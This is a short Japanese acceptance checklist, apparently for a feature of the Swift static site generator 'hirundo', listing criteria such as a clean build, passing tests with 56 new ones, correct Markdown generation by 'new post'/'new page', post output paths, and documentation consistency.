- `swift build` が警告なしで通る
- `swift test` が全件 PASS（新規 56 テストを含む: Task 1 が 9、Task 2 が 12、Task 3 が 27、Task 5 が 8）
- `hirundo new post` / `hirundo new page` が設定を尊重した Markdown を生成する
- 生成した post が `hirundo build` で `/posts/<slug>/` に出力される
- README ×2 と CLAUDE.md がコードと一致する
